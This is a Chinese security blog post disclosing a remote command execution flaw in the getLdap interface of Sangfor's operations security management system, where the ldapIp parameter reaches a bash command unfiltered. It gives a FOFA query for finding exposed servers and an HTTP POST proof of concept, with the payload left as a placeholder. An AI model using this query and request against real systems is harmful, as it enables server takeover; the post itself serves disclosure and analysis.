---
title: "深信服运维安全管理系统 getLdap 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html
asset_dir: assets/深信服运维安全管理系统-getldap-远程命令执行漏洞
---

# 深信服运维安全管理系统 getLdap 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/6 08:41
- 256浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

软件

SQL

服务器

---

# 漏洞简介

深信服运维安全管理系统 getLdap 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

安全工具开发

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"
>
> 漏洞预警服务

# 漏洞分析

看下 `com.sbr.fort.web.controller.user.FortLdapUserController#getLdap`的实现逻辑

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-001-972afb145925.webp)](https://image.mrxn.net/31887e39155e42eaaa3bd89287cd6c93.webp)

参数**ldapIp**被直接拼接在**bash**脚本后面，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/user;help/getLdap HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

ldapIp=RCE_POC
```

访问命令执行结果文件

计算机服务器

[![深信服运维安全管理系统 getLdap 远程命令执行漏洞](images/img-003-c9451bff8030.webp)](https://image.mrxn.net/b34bebef295247b1ae8641efd11e7760.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKb0lEQVR4Aeyai3YjOQ5Dc+f//3nXKAYSLbHkck9ie7c1J2xQAEhVxFLnMf3P19fXf/5t/Gf4L/cbpGNp/Vh8/1Fx31L5fJV2lfNez6L7V/hsrzO/BnLT9sennEAbyG3qX89E9QkAX8BdHwiu8mfOe0P4gSZba8QtAY69bumlj6qHC61ltCY0D7EndJQ+hv1XMde3gWRy5+87gWkg0KcPc756VL8RlQd6r0o35x5CiBprFcrngPB7LYTgIFCco+oH5z7XCavakYPoBTWOfq2ngYjc8b4T2AN539mXO//KQKBfUV1vRd5da0XmoNdA5PIosm/MIbxAk4DjCz7cf4Mx9tJaAbMfOgdzrjpF2/SHkl8ZyA8921/Z5lcGojfHAfF2eS30SUNogKnL3zKrj6IV3hKtFbe0fQDttgCNP0uAw1/p6u2o9J/gfmUgXz/xZH9pjz2QDxv8NBBfyTNcPT+cX/dcB+HLe1iH0ABTDSt/E28JcPx1k33Ob/Lphz1Cm5SPAdEfsG2JY/24roqngVSmzb3uBNpAgOPtgmv4W4+Y36JxD+jPNmpauxbWPnkVED7lq4Dwub8QgqvqIDS4hrlHG0gmd/6+E9gDed/Zlzv/o+v3b6PsPJDQr6/3g5kbyu6WrhNC1N4ZFgvVKBaWQ5JHAdEfOHj9AbS/1uVRiFco/4nYN0Sn+UFxaSDQ3ww4z/2GQPeYy1h9/tBrIHLXQKxznbWMEL7MuQZC81poH4QGiJ7CviwAx20xB7GGjtbOEMKb9UsDyQVvzP+KrdtAYJ7W6gT81mSE6JE594DQoGPls18I4VU+Bsya+0Fo0NFa7gOhV5z9QuvKx7BWIUR/6Jh97gVdbwPJxp2/7wT2QN539uXO/0BcF6sQa+joqyVc+aw9QvVRXPXJq3jkr3TVKSA+n+wRr8iccwg/YOoOgbsv6upzJXITuO8hbd8QncIHxfSD4dVny2+Da8xBTB46WhPaX6F0h3XofSDyK5o9QveEqIeO1jKqxgHdC5FbM0LwgKnjBgF32MRb4v1uafvYN6QdxWckeyCfMYf2FG0gEFfL10hoF4QG/V9xwDmnWkfVo+JGvz3CSjNXoWoc0J8T+vOrrvKYyyjvWUD0zzrMnPXcF2ZfG0g2/lX5h32yy297q2eFeaqVz5zfjIwQPewRwjkHoVU9IDToqH6OXKMcZp94B4TutRCCgxmlK6Br3hvWnOoU0H37hvj0PgT3QD5kEH6M6ecQXSGHTRVCv2bWqzroPoh89LtOCOEBbGv/eK4Rt0TeK3GzHh/A8fNAVXMYhj8g/EBTcq1J4OjrtdA+5WNYE46a1vuG6BQ+KKaBQEwcaI+paa4CON4SmNFNqnprGbMv88qh99f6LGD2uS/MWu5j31XO/owQe2Qu9xvz7JsGMpr3+rUnsAfy2vN+uNtyIL5KEFcQaA2B9tdUI78T12WE7oc5/y5tPQFTjXvUrxWkBDjqEzWlEB7oOJluBHQdIr/Rlz5g9kNw0HE5kEs7bVN1An/MtZ/UIaZUvYWZ806ZG3N7znD0aw3z/uJzQHiAs9YT73pguikwc27gOiHMPvEKCA06ugd0Tl6FtTPcN+TsZN7ELweiiSrys0GfOkSe9TGH2QMzN9ZpDY99ej4HhN9rIdxz6uuQrvBaqLUCog7uf0MsTSGvQrlC+RjiHdD7QeTWct1yINm489ecwB7Ia8758i7T77JyJcTVypxzXzch3Psg1oDtJQLHF1qg6cApp73GaIUnif0Qfb0WQnAnpY2G2Qf3nPo5WmGR2CMs5K99Q6pTeSPXBgIxcehYPZcmq4Du01oBwSn/08h7ukfmVrn9EM8BHSvtSi/V2Qfn/ewRqkah3KG1wmshRD/xjjYQGXa8/wT2QN4/g7snmAbiqyO8c34vYL5mENy3pX1RhuDhHlc+7euAqPPadUIIDWaU7hhrvc5orxCin3JH9jq3ZoSogxrty+he0GumgeSCnb/+BNpAPK3qEaBP0DrMnHtktD9zELWZc26/0ByEHzpak28Ma0KIGnsg1oCpP0Lg+JtAeyiqJuId1iHqAFN32AZyx+7F205gD+RtR19vPA0EOK4iUFd8s76KGb+lO7AOTH3hGuceuTFEbeaezSF6uH9GCA1obYHpc7CYa51bE0LUWhPCzE0DUfGO951A+x9U1SNoioqsaa2AmC7QZKC9QRC5RdU4Vpy1R+heGV0DsTf0X51by37n1h6h/UJ7Ifby+hlUH0Wu2Tckn8YH5O23vXA+aU3R4Wf2WghRq3wMCA06usdVhKjNvVe1V30QfaHjqm+leS+Ye0DnrvrecEOqT2tzPoE9EJ/Eh2AbiK9U9VzQr5516NxYC12zP6P90H0QuTUhBOdaiDV0tJYRug6RZ9259lB4LYTwi3dAcNLPwl6hPcodK86asA1Eix3vP4H2bS+cvwWestCPrNwB97XmhfZnhPBLHyP7rGXOuTWIXjB/i2vvGULUuldGCA16X+ice0LnIPIrmj3CvO++ITqRD4o9kA8ahh5lGki+PhBXENaoRgoIn3JH7ufcGoQfarTPdRkrbcXBvIf7way5V0b7heaVjwHRb+S1dt0ZTgM5M27+NSfQBqLpKSCmC/2LmfhVjI8KvceoaV31Eq/ImtY5YO4LnYM5z/XKq/6Zq3KY+9qnnmcBva7yQOhZawPJ5P9i/v/yzHsgHzbJ9stFP5evohDmK2UfhAaYKhGYfiUPweUC7aeA0GDG7F/l6uMYfdD7WoM1d9ZL9RC1ylcB4YOO7gud2zdkdYpv0KaBQJ+Wnwc6B5F7ukL7nkWIXtCx6qE9FJVWcdD7qU5hn3IHhM+aEP6cU/2j8N5CiL2UO6aBPGq49d89gT2Q3z3fp7svf7noa1R1hbhuQCVPnHsJLSq/EpUfOL5ZsCaseonPAVEH65+zcs2zfXPtKnff7Nk3JJ/GB+Tt215PK6OfL3Or3P4KYX4zK1/mIGoyt8rhOb97QdQBpi7js+cBHDcbaHsAjds3pB1Llbyem76GQJ8WXMvHx67emtGjNaz7u4+8Cuh+rRX2ZITug8itq8YBoXkthODsF0Jw0FHeHHCuZd+jfN+QRyf0Yn0P5MUH/mi7NhBdzWfiUWPrEFc594aZsz/7zEH4vf43WPV/1M81K589wqs+iM9LNY42kFWTrb3uBKaBQEwNanzdo321bwW/Fv9Bf07b/LYJzVUo/Swqf8VB3x/u88pfcdDrpoFUBZt73QnsgbzurC/t9KMD8fW/tPOJCfr1Hft5LXS5coe5jKMGvb990Dk4z91L6FrlY1SauUf4owN5tNnW4wRWf/7KQKC/ZX578kNUnHVrQog+1jJKV2RulcN5r1ynnoqKg+gB/TfFEFzlf8Rl3fmvDMTNNz5/Ansgz5/Zr1ZMA9F1XcWVp8n1lR/OrzmEBv2vBfeArkHk1oTwmKuereLUb4zsg3kv+2HWYObszzgNJIs7f/0JtIFATBCu4epRofeofH7ToPsgcmtC1yofwxpEHfQbBTNnf0YIX+ZWOYQfaDY/FzD9ZgE6Z18rTIk1YRtI0nf6xhPYA3nj4Vdb/xcAAP//iWpJvwAAAAZJREFUAwDGbuKS1URfmAAAAABJRU5ErkJggg==)

手机扫码阅读
